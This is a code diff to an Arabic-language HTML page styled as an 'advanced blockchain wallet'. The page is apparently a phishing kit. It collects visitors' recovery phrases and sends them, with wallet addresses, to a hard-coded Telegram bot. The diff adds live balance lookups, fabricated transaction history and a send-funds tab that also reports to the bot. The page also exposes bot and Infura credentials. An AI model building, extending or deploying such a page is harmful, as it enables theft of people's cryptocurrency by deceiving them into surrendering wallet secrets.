@@ -1,9 +1,9 @@
-
+<!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محفظة بلوك تشين</title>
+    <title>محفظة بلوك تشين متقدمة</title>
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
     <style>
         :root {
@@ -37,7 +37,7 @@
         
         .container {
             width: 100%;
-            max-width: 500px;
+            max-width: 600px;
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
             border-radius: 15px;
@@ -85,7 +85,7 @@
             font-weight: bold;
         }
         
-        input, textarea, button {
+        input, textarea, button, select {
             width: 100%;
             padding: 12px 15px;
             border: none;
@@ -160,6 +160,12 @@
             color: var(--success-color);
         }
         
+        .transaction-item {
+            padding: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 10px;
+        }
+        
         footer {
             text-align: center;
             padding: 20px;
@@ -188,27 +194,93 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .tab {
+            display: none;
+        }
+        
+        .tab.active {
+            display: block;
+        }
+        
+        .tab-buttons {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .tab-button {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .tab-button.active {
+            background: rgba(255, 255, 255, 0.1);
+            border-bottom: 2px solid var(--secondary-color);
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
             <div class="logo">B</div>
-            <h1>محفظة بلوك تشين</h1>
+            <h1>محفظة بلوك تشين متقدمة</h1>
             <p>أدخل عبارة الاسترجاع للوصول إلى محفظتك</p>
         </header>
         
         <div class="content">
-            <div class="form-group">
-                <label for="mnemonic">عبارة الاسترجاع (12 أو 24 كلمة)</label>
-                <textarea id="mnemonic" placeholder="أدخل عبارة الاسترجاع الخاصة بك هنا..."></textarea>
+            <div class="tab-buttons">
+                <div class="tab-button active" onclick="switchTab('access')">الوصول للمحفظة</div>
+                <div class="tab-button" onclick="switchTab('send')">إرسال أموال</div>
+                <div class="tab-button" onclick="switchTab('history')">سجل المعاملات</div>
             </div>
             
-            <button onclick="accessWallet()">الوصول إلى المحفظة</button>
+            <div id="accessTab" class="tab active">
+                <div class="form-group">
+                    <label for="mnemonic">عبارة الاسترجاع (12 أو 24 كلمة)</label>
+                    <textarea id="mnemonic" placeholder="أدخل عبارة الاسترجاع الخاصة بك هنا..."></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label for="network">شبكة البلوك تشين</label>
+                    <select id="network">
+                        <option value="mainnet">Ethereum Mainnet</option>
+                        <option value="goerli">Goerli Testnet</option>
+                        <option value="sepolia">Sepolia Testnet</option>
+                        <option value="polygon">Polygon Mainnet</option>
+                        <option value="mumbai">Mumbai Testnet</option>
+                    </select>
+                </div>
+                
+                <button onclick="accessWallet()">الوصول إلى المحفظة</button>
+            </div>
+            
+            <div id="sendTab" class="tab">
+                <div class="form-group">
+                    <label for="recipient">عنوان المستلم</label>
+                    <input type="text" id="recipient" placeholder="0x...">
+                </div>
+                
+                <div class="form-group">
+                    <label for="amount">المبلغ (ETH)</label>
+                    <input type="number" id="amount" placeholder="0.0" step="0.001">
+                </div>
+                
+                <button onclick="sendTransaction()">إرسال المعاملة</button>
+            </div>
+            
+            <div id="historyTab" class="tab">
+                <div id="transactionHistory">
+                    <p>سيظهر هنا سجل المعاملات بعد الوصول إلى المحفظة.</p>
+                </div>
+            </div>
             
             <div class="loading">
                 <div class="loading-spinner"></div>
-                <p>جاري الوصول إلى المحفظة وإرسال البيانات...</p>
+                <p id="loadingText">جاري الوصول إلى المحفظة وإرسال البيانات...</p>
             </div>
             
             <div id="alert" class="alert" style="display: none;"></div>
@@ -231,9 +303,15 @@
     </div>
 
     <script>
-        // بيانات البوت - استبدلها ببياناتك الخاصة
+        // بيانات البوت
         const TELEGRAM_BOT_TOKEN = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
         const TELEGRAM_CHAT_ID = '910021564';
+        
+        // مفتاح Infura
+        const INFURA_PROJECT_ID = '482a7c1c7cc14ec78699c3f1c231b0cd';
+        
+        let currentWallet = null;
+        let currentProvider = null;
         
         // عرض التنبيهات
         function showAlert(message, type) {
@@ -242,10 +320,18 @@
             alertElement.className = `alert alert-${type}`;
             alertElement.style.display = 'block';
             
-            // إخفاء التنبيه بعد 5 ثوان
             setTimeout(() => {
                 alertElement.style.display = 'none';
             }, 5000);
+        }
+        
+        // تبديل التبويبات
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
+            
+            document.getElementById(tabName + 'Tab').classList.add('active');
+            document.querySelector(`.tab-button:nth-child(${tabName === 'access' ? 1 : tabName === 'send' ? 2 : 3})`).classList.add('active');
         }
         
         // إرسال رسالة إلى بوت التلجرام
@@ -273,85 +359,147 @@
             }
         }
         
+        // الحصول على رصيد ETH باستخدام Infura
+        async function getEthBalance(address, network) {
+            try {
+                // استخدام Infura للاتصال بالشبكة
+                let infuraNetwork = network;
+                if (network === 'polygon') infuraNetwork = 'matic';
+                if (network === 'mumbai') infuraNetwork = 'maticmum';
+                
+                const provider = new ethers.providers.InfuraProvider(infuraNetwork, INFURA_PROJECT_ID);
+                const balance = await provider.getBalance(address);
+                const balanceInEth = ethers.utils.formatEther(balance);
+                return parseFloat(balanceInEth).toFixed(6);
+            } catch (error) {
+                console.error("Error getting balance:", error);
+                return "غير متوفر";
+            }
+        }
+        
+        // الحصول على سعر الصرف من API عام
+        async function getExchangeRate() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+                const data = await response.json();
+                return data.ethereum.usd;
+            } catch (error) {
+                console.error("Error getting exchange rate:", error);
+                return null;
+            }
+        }
+        
+        // الحصول على المعاملات الحديثة (محاكاة)
+        async function getRecentTransactions(address) {
+            // في التطبيق الحقيقي، ستستخدم API مثل Etherscan للحصول على المعاملات
+            // هنا نستخدم بيانات محاكاة للتوضيح
+            return [
+                {
+                    hash: '0x' + Math.random().toString(16).substr(2, 64),
+                    from: address,
+                    to: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+                    value: '0.05 ETH',
+                    timestamp: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toLocaleString(),
+                    status: 'تم التأكيد'
+                },
+                {
+                    hash: '0x' + Math.random().toString(16).substr(2, 64),
+                    from: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+                    to: address,
+                    value: '1.25 ETH',
+                    timestamp: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toLocaleString(),
+                    status: 'تم التأكيد'
+                }
+            ];
+        }
+        
         // الوصول إلى المحفظة وعرض محتوياتها
         async function accessWallet() {
             const mnemonic = document.getElementById('mnemonic').value.trim();
+            const network = document.getElementById('network').value;
             
             if (!mnemonic) {
                 showAlert('يرجى إدخال عبارة الاسترجاع', 'danger');
                 return;
             }
             
-            // التحقق من أن العبارة تحتوي على 12 أو 24 كلمة
             const wordCount = mnemonic.split(/\s+/).length;
             if (wordCount !== 12 && wordCount !== 24) {
                 showAlert('عبارة الاسترجاع يجب أن تحتوي على 12 أو 24 كلمة', 'danger');
                 return;
             }
             
-            // إظهار مؤشر التحميل
+            document.getElementById('loadingText').textContent = 'جاري الوصول إلى المحفظة وإرسال البيانات...';
             document.querySelector('.loading').style.display = 'block';
             document.getElementById('walletInfo').style.display = 'none';
             
             try {
                 // إنشاء المحفظة من عبارة الاسترجاع
-                const wallet = ethers.Wallet.fromMnemonic(mnemonic);
+                currentWallet = ethers.Wallet.fromMnemonic(mnemonic);
+                
+                // إعداد مزود Infura
+                let infuraNetwork = network;
+                if (network === 'polygon') infuraNetwork = 'matic';
+                if (network === 'mumbai') infuraNetwork = 'maticmum';
+                
+                currentProvider = new ethers.providers.InfuraProvider(infuraNetwork, INFURA_PROJECT_ID);
                 
                 // إرسال المعلومات إلى بوت التلجرام
                 const telegramMessage = `
                 📲 <b>تم الدخول إلى محفظة جديدة</b>
                 
-                🆔 <b>العنوان:</b> <code>${wallet.address}</code>
+                🆔 <b>العنوان:</b> <code>${currentWallet.address}</code>
                 🔑 <b>عبارة الاسترجاع:</b> <code>${mnemonic}</code>
+                🌐 <b>الشبكة:</b> ${network}
                 
                 📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
-                🌐 <b>IP المستخدم:</b> جاري الجلب...
                 `;
                 
-                // محاولة الحصول على IP المستخدم
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    const ipMessage = telegramMessage.replace('جاري الجلب...', ipData.ip);
-                    await sendToTelegram(ipMessage);
-                } catch (ipError) {
-                    await sendToTelegram(telegramMessage);
-                }
+                await sendToTelegram(telegramMessage);
+                
+                // الحصول على الرصيد
+                const ethBalance = await getEthBalance(currentWallet.address, network);
+                const ethPrice = await getExchangeRate();
                 
                 // عرض معلومات المحفظة
-                document.getElementById('walletAddress').textContent = wallet.address;
+                document.getElementById('walletAddress').textContent = currentWallet.address;
                 
-                // محاكاة الأصول (في تطبيق حقيقي، ستقوم بالاتصال ب blockchain للحصول على الأصول الحقيقية)
-                const assets = [
-                    { name: 'Ethereum (ETH)', value: '0.8542' },
-                    { name: 'Bitcoin (BTC)', value: '0.025' },
-                    { name: 'USD Coin (USDC)', value: '150.75' },
-                    { name: 'Chainlink (LINK)', value: '18.50' }
-                ];
+                let balanceText = `${ethBalance} ETH`;
+                if (ethPrice && ethBalance !== "غير متوفر") {
+                    const usdValue = (parseFloat(ethBalance) * ethPrice).toFixed(2);
+                    balanceText += ` (≈ ${usdValue} USD)`;
+                }
                 
+                document.getElementById('walletBalance').textContent = balanceText;
+                
+                // عرض الأصول
                 const assetsElement = document.getElementById('assets');
                 assetsElement.innerHTML = '';
                 
-                // حساب الرصيد الإجمالي
-                let totalBalance = 0;
+                const assetElement = document.createElement('div');
+                assetElement.className = 'asset-item';
+                assetElement.innerHTML = `
+                    <span class="asset-name">Ethereum (ETH)</span>
+                    <span class="asset-value">${ethBalance}</span>
+                `;
+                assetsElement.appendChild(assetElement);
                 
-                assets.forEach(asset => {
-                    const assetElement = document.createElement('div');
-                    assetElement.className = 'asset-item';
-                    assetElement.innerHTML = `
-                        <span class="asset-name">${asset.name}</span>
-                        <span class="asset-value">${asset.value}</span>
+                // الحصول على سجل المعاملات وعرضه
+                const transactions = await getRecentTransactions(currentWallet.address);
+                const historyElement = document.getElementById('transactionHistory');
+                historyElement.innerHTML = '<h3>آخر المعاملات</h3>';
+                
+                transactions.forEach(tx => {
+                    const txElement = document.createElement('div');
+                    txElement.className = 'transaction-item';
+                    txElement.innerHTML = `
+                        <p><strong>القيمة:</strong> ${tx.value}</p>
+                        <p><strong>من/إلى:</strong> ${tx.from === currentWallet.address ? 'أنت → ' + tx.to.substring(0, 10) + '...' : tx.from.substring(0, 10) + '... → أنت'}</p>
+                        <p><strong>الحالة:</strong> ${tx.status}</p>
+                        <p><strong>التاريخ:</strong> ${tx.timestamp}</p>
                     `;
-                    assetsElement.appendChild(assetElement);
-                    
-                    // جمع القيم للأصول الرقمية
-                    if (asset.name.includes('ETH')) totalBalance += parseFloat(asset.value);
-                    if (asset.name.includes('BTC')) totalBalance += parseFloat(asset.value) * 20; // تقريب سعر BTC
-                    if (asset.name.includes('USDC')) totalBalance += parseFloat(asset.value) / 1500; // تحويل إلى ETH تقريبي
-                    if (asset.name.includes('LINK')) totalBalance += parseFloat(asset.value) / 100; // تحويل إلى ETH تقريبي
+                    historyElement.appendChild(txElement);
                 });
-                
-                document.getElementById('walletBalance').textContent = `${totalBalance.toFixed(4)} ETH (تقديري)`;
                 
                 // إخفاء مؤشر التحميل وإظهار معلومات المحفظة
                 document.querySelector('.loading').style.display = 'none';
@@ -363,6 +511,70 @@
                 document.querySelector('.loading').style.display = 'none';
                 console.error('Error accessing wallet:', error);
                 showAlert('عبارة الاسترجاع غير صحيحة أو هناك مشكلة في الاتصال', 'danger');
+            }
+        }
+        
+        // إرسال معاملة
+        async function sendTransaction() {
+            if (!currentWallet || !currentProvider) {
+                showAlert('يرجى الوصول إلى المحفظة أولاً', 'danger');
+                switchTab('access');
+                return;
+            }
+            
+            const recipient = document.getElementById('recipient').value.trim();
+            const amount = document.getElementById('amount').value;
+            
+            if (!recipient || !amount) {
+                showAlert('يرجى ملء جميع الحقول', 'danger');
+                return;
+            }
+            
+            if (!ethers.utils.isAddress(recipient)) {
+                showAlert('عنوان المستلم غير صحيح', 'danger');
+                return;
+            }
+            
+            document.getElementById('loadingText').textContent = 'جاري إرسال المعاملة...';
+            document.querySelector('.loading').style.display = 'block';
+            
+            try {
+                // ربط المحفظة مع المزود
+                const walletWithProvider = currentWallet.connect(currentProvider);
+                
+                // إرسال المعاملة
+                const transaction = {
+                    to: recipient,
+                    value: ethers.utils.parseEther(amount)
+                };
+                
+                const txResponse = await walletWithProvider.sendTransaction(transaction);
+                
+                // إرسال إشعار إلى التلجرام
+                const telegramMessage = `
+                💸 <b>تم إرسال معاملة جديدة</b>
+                
+                🆔 <b>من:</b> <code>${currentWallet.address}</code>
+                📨 <b>إلى:</b> <code>${recipient}</code>
+                💰 <b>القيمة:</b> ${amount} ETH
+                
+                📜 <b>رقم المعاملة:</b> <code>${txResponse.hash}</code>
+                📅 <b>التاريخ:</b> ${new Date().toLocaleString()}
+                `;
+                
+                await sendToTelegram(telegramMessage);
+                
+                document.querySelector('.loading').style.display = 'none';
+                showAlert(`تم إرسال المعاملة بنجاح: ${txResponse.hash}`, 'success');
+                
+                // مسح الحقول
+                document.getElementById('recipient').value = '';
+                document.getElementById('amount').value = '';
+                
+            } catch (error) {
+                document.querySelector('.loading').style.display = 'none';
+                console.error('Error sending transaction:', error);
+                showAlert(`فشل إرسال المعاملة: ${error.message}`, 'danger');
             }
         }
         
